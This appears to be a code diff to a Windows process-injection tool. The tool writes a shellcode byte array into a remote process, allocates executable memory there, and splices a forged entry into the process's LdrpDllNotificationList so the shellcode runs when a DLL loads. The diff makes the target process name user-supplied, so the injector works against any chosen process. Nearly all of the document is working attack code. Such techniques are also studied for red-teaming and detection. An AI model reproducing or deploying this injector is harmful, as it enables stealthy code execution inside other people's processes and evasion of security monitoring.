@@ -33,6 +33,7 @@ int FindTarget(const char* procname) {
     return pid;
 }
 
+
 // Our dummy callback function
 VOID DummyCallback(ULONG NotificationReason, const PLDR_DLL_NOTIFICATION_DATA NotificationData, PVOID Context)
 {
@@ -111,16 +112,20 @@ unsigned char shellcode[276] = { 0xfc, 0x48, 0x83, 0xe4, 0xf0, 0xe8, 0xc0, 0x0, 
 int main()
 {
     // Get local LdrpDllNotificationList head address
-    LPVOID headAddress = (LPVOID)GetDllNotificationListHead();
-    printf("[+] LdrpDllNotificationList head address: 0x%p\n", headAddress);
+    LPVOID localHeadAddress = (LPVOID)GetDllNotificationListHead();
+    printf("[+] Local LdrpDllNotificationList head address: 0x%p\n", localHeadAddress);
 
+    // Get string from user input
+    char processName[100];
+    printf("[+] Enter a string: ");
+    scanf_s("%s", processName, sizeof(processName));
 
     // Open handle to remote process
-    HANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, FindTarget("dllHook.exe"));
+    HANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, FindTarget(processName));
     printf("[+] Got handle to remote process\n");
 
     // Print the remote Dll Notification List
-    PrintDllNotificationList(hProc, headAddress);
+    PrintDllNotificationList(hProc, localHeadAddress);
 
     // Allocate memory for our shellcode in the remote process
     LPVOID shellcodeEx = VirtualAllocEx(hProc, 0, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
@@ -139,13 +144,13 @@ int main()
     
     // We want our new entry to be the first in the list 
     // so its List.Blink attribute should point to the head of the list
-    newEntry.List.Blink = (PLIST_ENTRY)headAddress;
+    newEntry.List.Blink = (PLIST_ENTRY)localHeadAddress;
 
     // Allocate memory buffer for LDR_DLL_NOTIFICATION_ENTRY
     BYTE* remoteHeadEntry = (BYTE*)malloc(sizeof(LDR_DLL_NOTIFICATION_ENTRY));
 
     // Read the head entry from the remote process
-    ReadProcessMemory(hProc, headAddress, remoteHeadEntry, sizeof(LDR_DLL_NOTIFICATION_ENTRY), nullptr);
+    ReadProcessMemory(hProc, localHeadAddress, remoteHeadEntry, sizeof(LDR_DLL_NOTIFICATION_ENTRY), nullptr);
 
     // Set the new entry's List.Flink attribute to point to the original first entry in the list
     newEntry.List.Flink = ((PLDR_DLL_NOTIFICATION_ENTRY)remoteHeadEntry)->List.Flink;
@@ -160,7 +165,7 @@ int main()
 
     // Calculate the addresses we need to overwrite with our new entry's address
     // The previous entry's Flink (head) and the next entry's Blink (original 1st entry)
-    LPVOID previousEntryFlink = (LPVOID)((BYTE*)headAddress + offsetof(LDR_DLL_NOTIFICATION_ENTRY, List) + offsetof(LIST_ENTRY, Flink));
+    LPVOID previousEntryFlink = (LPVOID)((BYTE*)localHeadAddress + offsetof(LDR_DLL_NOTIFICATION_ENTRY, List) + offsetof(LIST_ENTRY, Flink));
     LPVOID nextEntryBlink = (LPVOID)((BYTE*)((PLDR_DLL_NOTIFICATION_ENTRY)remoteHeadEntry)->List.Flink + offsetof(LDR_DLL_NOTIFICATION_ENTRY, List) + offsetof(LIST_ENTRY, Blink));
 
     // Overwrite the previous entry's Flink (head) with our new entry's address
@@ -173,6 +178,6 @@ int main()
     printf("[+] Our new entry has been inserted.\n");
 
     // Print the remote Dll Notification List
-    PrintDllNotificationList(hProc, headAddress);
+    PrintDllNotificationList(hProc, localHeadAddress);
 
 }
